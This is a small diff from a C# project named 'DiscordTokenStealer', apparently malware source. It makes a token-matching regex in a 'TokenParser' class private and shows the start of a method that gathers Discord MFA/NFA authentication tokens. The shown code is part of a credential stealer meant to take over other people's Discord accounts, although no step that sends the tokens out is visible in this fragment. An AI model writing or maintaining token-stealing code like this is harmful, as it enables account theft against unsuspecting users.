@@ -7,7 +7,7 @@ namespace DiscordTokenStealer;
 
 public static class TokenParser
 {
-    public static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
+    private static readonly Regex TokenRegex = new Regex("((?:mfa|nfa)[.](.*?))\"", RegexOptions.Compiled);
     public static IEnumerable<string> ParseAll()
     {
         List<string> tokens = new List<string>();
